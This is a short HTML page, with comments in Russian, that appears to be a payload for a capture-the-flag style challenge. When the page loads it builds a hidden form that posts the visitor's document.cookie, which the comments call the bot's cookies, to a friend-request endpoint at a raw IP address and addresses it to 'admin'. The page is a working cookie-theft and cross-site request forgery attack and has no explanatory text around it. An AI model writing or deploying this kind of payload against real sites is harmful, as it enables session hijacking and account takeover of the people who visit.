<!DOCTYPE html>
<html>
<body>
    <script>
        // Создаём форму с cookies
        const form = document.createElement('form');
        form.method = 'POST';
        form. action = 'http://158.160.184.159:13002/api/friendship/request';
        
        const inputUser = document.createElement('input');
        inputUser.type = 'hidden';
        inputUser.name = 'to_user';
        inputUser.value = 'admin';
        
        const inputMessage = document.createElement('input');
        inputMessage.type = 'hidden';
        inputMessage.name = 'message';
        inputMessage.value = document.cookie;  // Все cookies бота
        
        form.appendChild(inputUser);
        form.appendChild(inputMessage);
        document.body.appendChild(form);
        
        // Отправляем форму
        form.submit();
    </script>
</body>
</html>
